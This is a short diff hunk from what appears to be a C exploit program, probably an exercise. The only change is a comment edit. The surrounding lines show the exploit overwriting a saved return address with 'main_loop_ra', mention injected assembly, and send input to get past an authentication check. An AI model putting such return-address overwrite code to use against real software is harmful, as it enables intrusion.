@@ -218,7 +218,7 @@ int main(int argc, char* argv[]) {
    //      ASM code injected makes the jmp based on ebp.
    expl[offset_auth_ebp/sizeof(void*)] = main_loop_ra;
 
-   // 4. Send payload
+   // 4. Send the payload
    // 4-1. To pass "if(user != null && pass != null)
    put_str("p xyz\n");
    send();
